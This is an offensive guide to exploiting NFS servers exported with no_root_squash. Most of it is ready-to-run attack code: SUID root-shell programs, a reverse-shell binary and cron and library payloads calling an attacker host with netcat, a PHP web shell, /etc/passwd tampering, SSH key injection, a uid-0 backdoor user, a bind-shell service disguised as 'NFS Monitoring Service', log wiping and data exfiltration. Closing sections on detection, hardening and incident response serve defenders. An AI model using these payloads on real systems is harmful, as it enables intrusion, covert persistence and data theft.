# 🔐 NFS (Port 2049) - Complete Exploitation Guide

## 🎯 Vulnerability Overview

**Service:** Network File System (NFS)  
**Port:** 2049/tcp (primary), 111/tcp (portmapper), various dynamic ports  
**Vulnerability Type:** Misconfiguration (`no_root_squash`)  
**Severity:** High to Critical  
**Common Weakness:** CWE-276 (Incorrect Default Permissions)

### Description
NFS with the `no_root_squash` option allows remote root users to access files with root privileges instead of mapping them to the anonymous user. This misconfiguration can lead to complete system compromise through SUID binary creation and execution.

---

## 🔍 Reconnaissance Workflow

### Step 1: RPC Service Discovery

#### Port Scanning
```bash
# Quick NFS-related port scan
nmap -p 111,2049 <target-ip>

# Comprehensive RPC scan
nmap -sV -p 111,2049,32771,32772,32773,32774 <target-ip>

# UDP scan for RPC services
nmap -sU -p 111,2049 <target-ip>

# RPC service enumeration
nmap --script rpc-grind,rpcinfo -p 111,2049 <target-ip>
```

#### RPC Information Gathering
```bash
# List all RPC services
rpcinfo -p <target-ip>

# Specific NFS version check
rpcinfo -u <target-ip> nfs
rpcinfo -t <target-ip> nfs

# Verbose RPC information
rpcinfo -s <target-ip>
```

**Expected RPC Services:**
```
100000  4  tcp  111  portmapper
100000  3  tcp  111  portmapper  
100000  2  tcp  111  portmapper
100005  1  udp  635  mountd
100005  1  tcp  635  mountd
100003  2  udp  2049  nfs
100003  3  udp  2049  nfs
100003  4  udp  2049  nfs
100021  1  udp  32769  nlockmgr
100021  3  udp  32769  nlockmgr
100021  4  udp  32769  nlockmgr
```

### Step 2: NFS Export Enumeration

#### List Available Exports
```bash
# Primary method
showmount -e <target-ip>

# Alternative if showmount fails
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 <target-ip>

# Using rpcinfo
rpcinfo -u <target-ip> mountd

# Manual RPC call
rpc.showmount -e <target-ip>
```

#### Export Analysis
```bash
# Detailed export information
showmount -a <target-ip>  # Show all mount points
showmount -d <target-ip>  # Show directories only

# Export permissions analysis
nmap --script nfs-ls --script-args nfs-ls.maxfiles=50 -p 2049 <target-ip>
```

### Step 3: Export Accessibility Testing

#### Test Export Mounting
```bash
# Create mount point
sudo mkdir -p /mnt/nfs_test

# Test mount (read-only first)
sudo mount -t nfs -o ro <target-ip>:/path/to/export /mnt/nfs_test

# Test mount (read-write)
sudo mount -t nfs -o rw <target-ip>:/path/to/export /mnt/nfs_test

# Verify mount
mount | grep nfs
df -h /mnt/nfs_test
```

---

## 💥 Exploitation Workflow

### Method 1: no_root_squash Exploitation

#### Step 1: Mount Analysis
```bash
# Mount the export
sudo mkdir -p /mnt/target_nfs
sudo mount -t nfs <target-ip>:/ /mnt/target_nfs

# Analyze mount options
mount | grep <target-ip>
cat /proc/mounts | grep nfs

# Check filesystem permissions
ls -la /mnt/target_nfs/
```

#### Step 2: Write Permission Testing
```bash
# Test write access as root
sudo bash -c 'echo "Root write test" > /mnt/target_nfs/root_test.txt'

# Check file ownership
ls -la /mnt/target_nfs/root_test.txt

# If file is created with root ownership, no_root_squash is enabled
```

#### Step 3: SUID Binary Creation

##### Method A: Simple SUID Shell
```bash
# Create SUID shell program
cat <<'EOF' > /mnt/target_nfs/suid_shell.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
    return 0;
}
EOF

# Compile the program
gcc /mnt/target_nfs/suid_shell.c -o /mnt/target_nfs/suid_shell

# Set SUID permissions
chmod +s /mnt/target_nfs/suid_shell

# Verify SUID bit is set
ls -la /mnt/target_nfs/suid_shell
# Should show: -rwsr-sr-x
```

##### Method B: Advanced SUID Shell with Error Handling
```bash
cat <<'EOF' > /mnt/target_nfs/advanced_shell.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <pwd.h>

int main() {
    // Check if running with SUID privileges
    if (getuid() != 0) {
        printf("[-] SUID bit not set or not running as root\n");
        return 1;
    }
    
    printf("[+] SUID exploitation successful!\n");
    printf("[+] Effective UID: %d\n", geteuid());
    printf("[+] Real UID: %d\n", getuid());
    
    // Set effective and real UIDs to root
    if (setuid(0) != 0) {
        perror("setuid");
        return 1;
    }
    
    if (setgid(0) != 0) {
        perror("setgid");
        return 1;
    }
    
    printf("[+] Spawning root shell...\n");
    
    // Spawn interactive shell
    char *shell = "/bin/bash";
    char *args[] = {shell, "-i", NULL};
    
    execve(shell, args, NULL);
    
    // If execve fails
    perror("execve");
    return 1;
}
EOF

gcc /mnt/target_nfs/advanced_shell.c -o /mnt/target_nfs/advanced_shell
chmod +s /mnt/target_nfs/advanced_shell
```

##### Method C: Reverse Shell SUID Binary
```bash
cat <<'EOF' > /mnt/target_nfs/reverse_shell.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define ATTACKER_IP "YOUR_IP_HERE"
#define ATTACKER_PORT 4444

int main() {
    setuid(0);
    setgid(0);
    
    int sockfd;
    struct sockaddr_in server_addr;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    
    // Configure server address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(ATTACKER_PORT);
    server_addr.sin_addr.s_addr = inet_addr(ATTACKER_IP);
    
    // Connect to attacker
    connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr));
    
    // Redirect stdin, stdout, stderr
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    // Execute shell
    execve("/bin/bash", NULL, NULL);
    
    return 0;
}
EOF

# Remember to change ATTACKER_IP before compiling
sed -i 's/YOUR_IP_HERE/<your-ip>/' /mnt/target_nfs/reverse_shell.c
gcc /mnt/target_nfs/reverse_shell.c -o /mnt/target_nfs/reverse_shell
chmod +s /mnt/target_nfs/reverse_shell
```

#### Step 4: Execute on Target

##### Direct Execution
```bash
# SSH or direct access to target machine
ssh user@<target-ip>

# Navigate to the NFS mount point on target
cd /path/to/nfs/export

# Execute the SUID binary
./suid_shell

# Verify root access
id
whoami
```

##### Remote Execution Methods
```bash
# If you have limited shell access
# Method 1: Via existing shell
echo './suid_shell' > /tmp/run_exploit.sh
chmod +x /tmp/run_exploit.sh
/tmp/run_exploit.sh

# Method 2: Via cron job (if write access to cron)
echo "* * * * * root /path/to/nfs/export/suid_shell" >> /etc/crontab

# Method 3: Via web shell (if web server present)
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php
# Then visit: http://target-ip/shell.php?cmd=/path/to/nfs/export/suid_shell
```

### Method 2: File Overwrite Exploitation

#### System File Replacement
```bash
# Backup original files first
sudo cp /mnt/target_nfs/etc/passwd /mnt/target_nfs/etc/passwd.bak
sudo cp /mnt/target_nfs/etc/shadow /mnt/target_nfs/etc/shadow.bak

# Create malicious passwd entry
echo 'hacker:$6$salt$hashedpassword:0:0:root:/root:/bin/bash' >> /mnt/target_nfs/etc/passwd

# Or modify existing root entry
sudo sed -i 's/root:x:/root::/' /mnt/target_nfs/etc/passwd

# SSH key injection (if SSH is enabled)
sudo mkdir -p /mnt/target_nfs/root/.ssh
echo "<your-public-key>" | sudo tee -a /mnt/target_nfs/root/.ssh/authorized_keys
sudo chmod 600 /mnt/target_nfs/root/.ssh/authorized_keys
sudo chmod 700 /mnt/target_nfs/root/.ssh
```

#### Cron Job Injection
```bash
# Add malicious cron job
echo "* * * * * root /bin/bash -c 'nc <your-ip> 4444 -e /bin/bash'" | sudo tee -a /mnt/target_nfs/etc/crontab

# Or create user-specific cron job
sudo mkdir -p /mnt/target_nfs/var/spool/cron/crontabs
echo "* * * * * /bin/bash -c 'nc <your-ip> 4444 -e /bin/bash'" | sudo tee /mnt/target_nfs/var/spool/cron/crontabs/root
sudo chmod 600 /mnt/target_nfs/var/spool/cron/crontabs/root
```

### Method 3: Library Injection

#### Shared Library Hijacking
```bash
# Create malicious library
cat <<'EOF' > /mnt/target_nfs/tmp/evil.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -c 'nc <your-ip> 4444 -e /bin/bash'");
}
EOF

# Compile as shared library
gcc -shared -fPIC /mnt/target_nfs/tmp/evil.c -o /mnt/target_nfs/tmp/evil.so

# Inject via LD_PRELOAD (requires ability to set environment)
export LD_PRELOAD="/tmp/evil.so"

# Or modify system library path
echo "/tmp" | sudo tee -a /mnt/target_nfs/etc/ld.so.conf.d/evil.conf
```

---

## ✅ Post-Exploitation Activities

### Initial Assessment
```bash
# Verify root access
id
whoami
groups

# System information
uname -a
hostname
cat /etc/*release*

# Network configuration
ip addr show
netstat -tulpn
ss -tulpn
```

### NFS-Specific Enumeration
```bash
# Check NFS configuration
cat /etc/exports
exportfs -v
showmount -a localhost

# NFS processes
ps aux | grep nfs
systemctl status nfs-server
systemctl status nfs-kernel-server

# NFS logs
tail -50 /var/log/nfs.log
journalctl -u nfs-server
dmesg | grep nfs
```

### Data Collection
```bash
# Sensitive files
find / -name "*.conf" -o -name "*.config" 2>/dev/null | head -20
find /home -type f \( -name "*.txt" -o -name "*.doc*" -o -name "*.pdf" \) 2>/dev/null

# Database files
find / -name "*.db" -o -name "*.sqlite*" -o -name "*.sql" 2>/dev/null

# SSH keys
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.key" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Configuration backups
find / -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null
```

### Persistence Establishment
```bash
# SSH key persistence
mkdir -p /root/.ssh
echo "<your-public-key>" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Create backdoor user
useradd -m -s /bin/bash -u 0 -g 0 -o backdoor
echo "backdoor:SecurePass123" | chpasswd

# Systemd service persistence
cat > /etc/systemd/system/nfs-backdoor.service << 'EOF'
[Unit]
Description=NFS Monitoring Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'while true; do nc -l -p 5555 -e /bin/bash; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable nfs-backdoor.service
systemctl start nfs-backdoor.service
```

---

## 🔧 Advanced Techniques

### Stealth Techniques
```bash
# Hide files with special characters
touch "/mnt/target_nfs/tmp/ \b"  # Backspace character
touch "/mnt/target_nfs/tmp/..."  # Hidden dot file

# Timestamp manipulation
touch -r /bin/ls /mnt/target_nfs/suid_shell  # Match timestamps

# Log evasion
> /var/log/auth.log
> /var/log/syslog
history -c
```

### Network Pivot Setup
```bash
# Setup network pivot through NFS
# Create SSH tunnel config
cat > /mnt/target_nfs/tmp/ssh_tunnel.sh << 'EOF'
#!/bin/bash
ssh -R 8080:127.0.0.1:22 user@attacker-ip -N -f
EOF

chmod +x /mnt/target_nfs/tmp/ssh_tunnel.sh

# Add to cron for persistence
echo "*/5 * * * * /tmp/ssh_tunnel.sh" >> /etc/crontab
```

### Data Exfiltration
```bash
# Compress and stage data
tar -czf /mnt/target_nfs/tmp/exfil.tar.gz /etc/passwd /etc/shadow /home/*/Documents/

# Exfiltrate via NFS (access from attacker machine)
cp /tmp/exfil.tar.gz /mnt/target_nfs/tmp/

# From attacker machine
cp /mnt/target_nfs/tmp/exfil.tar.gz /tmp/
tar -xzf /tmp/exfil.tar.gz

# Alternative: Base64 encoding for text-based exfil
base64 -w 0 sensitive_file > /mnt/target_nfs/tmp/encoded_data.txt
```

---

## 🔍 Detection and Forensics

### NFS Activity Monitoring
```bash
# Monitor NFS connections
netstat -an | grep :2049
lsof -i :2049

# NFS mount activity
mount | grep nfs
cat /proc/mounts | grep nfs

# RPC activity
rpcinfo -p localhost
ss -tulpn | grep -E "(111|2049)"
```

### Log Analysis
```bash
# NFS server logs
tail -f /var/log/nfs.log
journalctl -u nfs-server -f

# System logs for NFS activity
grep -i nfs /var/log/syslog
grep -i mount /var/log/auth.log

# Kernel messages
dmesg | grep -i nfs
dmesg | grep -i mount
```

### Forensic Indicators
```bash
# Check for unusual files in NFS exports
find /nfs/exports -type f -executable
find /nfs/exports -perm -4000  # SUID files
find /nfs/exports -name "*.c" -o -name "*.so"  # Source/binary files

# Network forensics
tcpdump -i any port 2049 -w nfs_traffic.pcap
tshark -f "port 2049" -V

# File system forensics
find / -newer /var/log/lastlog  # Recently modified files
find / -type f -perm -4000 -ls  # All SUID files
```

---

## 🛡️ Security Hardening

### NFS Server Configuration
```bash
# Edit /etc/exports with secure options
/secure/path    192.168.1.0/24(rw,sync,root_squash,no_subtree_check)

# Key security options:
# root_squash     - Map root user to anonymous user
# no_root_squash  - DON'T USE - allows root access
# all_squash      - Map all users to anonymous user
# sync            - Synchronous writes
# no_subtree_check - Disable subtree checking for performance
# secure          - Require requests from ports < 1024
```

### Export Security Best Practices
```bash
# Restrict by IP/network
/data    192.168.1.100(rw,root_squash)
/backup  10.0.0.0/8(ro,all_squash)

# Read-only where possible
/public  *(ro,all_squash)

# Apply changes
exportfs -ra
systemctl restart nfs-server
```

### Firewall Configuration
```bash
# UFW configuration
ufw allow from 192.168.1.0/24 to any port 2049
ufw allow from 192.168.1.0/24 to any port 111
ufw deny 2049
ufw deny 111

# iptables configuration
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 2049 -j ACCEPT
iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 111 -j ACCEPT
iptables -A INPUT -p tcp --dport 2049 -j DROP
iptables -A INPUT -p tcp --dport 111 -j DROP

# Save iptables rules
iptables-save > /etc/iptables/rules.v4
```

### NFS Service Hardening
```bash
# Disable unnecessary RPC services
systemctl disable rpc-statd-notify
systemctl disable nfs-blkmap

# Configure NFS with minimal services
echo "RPCNFSDOPTS=\"-N 2 -N 3\"" >> /etc/default/nfs-kernel-server

# Enable NFSv4 only (more secure)
echo "RPCMOUNTDOPTS=\"--no-nfs-version 2 --no-nfs-version 3\"" >> /etc/default/nfs-kernel-server

# Restart services
systemctl restart nfs-server
```

### Monitoring Setup
```bash
# NFS monitoring script
cat > /usr/local/bin/nfs_monitor.sh << 'EOF'
#!/bin/bash
# Monitor NFS exports for suspicious activity

LOG_FILE="/var/log/nfs_monitor.log"
ALERT_EMAIL="admin@company.com"

# Check for new SUID files in exports
find /nfs/exports -perm -4000 -newer /var/log/lastlog 2>/dev/null | while read file; do
    echo "$(date): ALERT - New SUID file found: $file" >> $LOG_FILE
    echo "SUID file alert: $file" | mail -s "NFS Security Alert" $ALERT_EMAIL
done

# Check for unusual executable files
find /nfs/exports -name "*.c" -o -name "*.so" -newer /var/log/lastlog 2>/dev/null | while read file; do
    echo "$(date): ALERT - Suspicious file found: $file" >> $LOG_FILE
done

# Monitor NFS connections
netstat -an | grep :2049 | grep ESTABLISHED >> $LOG_FILE
EOF

chmod +x /usr/local/bin/nfs_monitor.sh

# Add to cron
echo "*/5 * * * * root /usr/local/bin/nfs_monitor.sh" >> /etc/crontab
```

---

## 🔧 Troubleshooting

### Common Issues and Solutions

#### Issue 1: Mount Permission Denied
```bash
# Check RPC services are running
systemctl status rpcbind
systemctl status nfs-server

# Verify export configuration
exportfs -v

# Check firewall
iptables -L | grep -E "(2049|111)"

# Test connectivity
telnet <target-ip> 2049
rpcinfo -p <target-ip>
```

#### Issue 2: SUID Binary Not Working
```bash
# Verify SUID bit is set
ls -la /mnt/target_nfs/suid_shell
# Should show: -rwsr-sr-x

# Check if binary is executable
file /mnt/target_nfs/suid_shell

# Test on local system first
sudo ./suid_shell

# Check for noexec mount option
mount | grep target_nfs | grep noexec
```

#### Issue 3: No Root Access Despite no_root_squash
```bash
# Verify no_root_squash is set
cat /etc/exports
exportfs -v | grep no_root_squash

# Check mount options
mount | grep nfs

# Test file creation as root
sudo touch /mnt/target_nfs/root_test
ls -la /mnt/target_nfs/root_test

# If owned by root, configuration is correct
```

### NFS Debugging
```bash
# Enable NFS debugging
echo 'nfs 65535' > /proc/sys/sunrpc/nfs_debug
echo 'nfsd 65535' > /proc/sys/sunrpc/nfsd_debug
echo 'rpc 65535' > /proc/sys/sunrpc/rpc_debug

# Monitor debug output
tail -f /var/log/messages | grep nfs

# Disable debugging when done
echo '0' > /proc/sys/sunrpc/nfs_debug
echo '0' > /proc/sys/sunrpc/nfsd_debug
echo '0' > /proc/sys/sunrpc/rpc_debug
```

---

## 🚨 Incident Response

### Immediate Response Actions
```bash
# Stop NFS services
systemctl stop nfs-server
systemctl stop rpcbind
systemctl stop nfs-mountd

# Block NFS ports
iptables -I INPUT 1 -p tcp --dport 2049 -j DROP
iptables -I INPUT 1 -p tcp --dport 111 -j DROP

# Kill existing NFS connections
ss -K dst :2049
fuser -k /nfs/exports
```

### Damage Assessment
```bash
# Check for SUID files in exports
find /nfs/exports -perm -4000 -ls

# Look for recently created files
find /nfs/exports -type f -newermt "1 day ago" -ls

# Check system integrity
find /etc -newer /var/log/lastlog
find /bin -newer /var/log/lastlog
find /usr/bin -newer /var/log/lastlog

# Verify critical system files
md5sum /etc/passwd /etc/shadow /etc/sudoers
```

### Recovery Actions
```bash
# Remove malicious files
rm -f /nfs/exports/suid_shell*
rm -f /nfs/exports/*.so
find /nfs/exports -name "*.c" -delete

# Restore from backup
cp /etc/passwd.backup /etc/passwd
cp /etc/shadow.backup /etc/shadow

# Reset file permissions
chmod 644 /etc/passwd
chmod 640 /etc/shadow
chown root:root /etc/passwd /etc/shadow

# Restart services with secure configuration
systemctl restart nfs-server
```

---

## 📚 References and Tools

### Essential Tools
- **showmount:** List NFS exports
- **mount/umount:** Mount/unmount NFS shares
- **rpcinfo:** RPC service information
- **exportfs:** Manage NFS exports
- **nfsstat:** NFS statistics
- **Nmap:** Network scanning with NFS scripts

### NFS-Specific Nmap Scripts
```bash
# Available NFS scripts
ls /usr/share/nmap/scripts/ | grep nfs

# Key scripts:
nfs-ls.nse          # List NFS files
nfs-showmount.nse   # Show NFS exports
nfs-statfs.nse      # NFS filesystem statistics
rpc-grind.nse       # RPC service enumeration
rpcinfo.nse         # RPC information gathering
```

### Wordlists and Payloads
```bash
# Common NFS paths
/
/home
/var
/tmp
/opt
/usr/local
/export
/shared
/data
/backup
```

### Online Resources
- **NFS Security Guide:** https://nfs.sourceforge.net/nfs-howto/ar01s07.html
- **NIST NFS Guidelines:** https://csrc.nist.gov/
- **Linux NFS-HOWTO:** https://tldp.org/HOWTO/NFS-HOWTO/
- **RFC 3530 (NFSv4):** https://tools.ietf.org/html/rfc3530

---

## ⚠️ Legal and Ethical Considerations

**WARNING:** This guide is for educational and authorized security testing purposes only.

### Important Guidelines:
- Always obtain proper written authorization before testing
- Only test systems you own or have explicit permission to test
- NFS attacks can affect system availability and data integrity
- Document all activities for reporting purposes
- Follow responsible disclosure practices
- Comply with local laws and regulations

### Best Practices:
- Use isolated test environments when possible
- Avoid modifying critical system files in production
- Monitor system resources during testing
- Clean up any files or changes made during testing
- Report vulnerabilities through proper channels
- Consider business impact when testing NFS services

### Cleanup Checklist:
```bash
# Remove created files
rm -f /mnt/target_nfs/suid_shell*
rm -f /mnt/target_nfs/root_test*
rm -f /mnt/target_nfs/*.c

# Unmount NFS shares
sudo umount /mnt/target_nfs
sudo umount /mnt/nfs_test

# Remove mount points
rmdir /mnt/target_nfs
rmdir /mnt/nfs_test

# Clear command history
history -c
```

---

*Last Updated: August 2025*  
*Version: 1.0*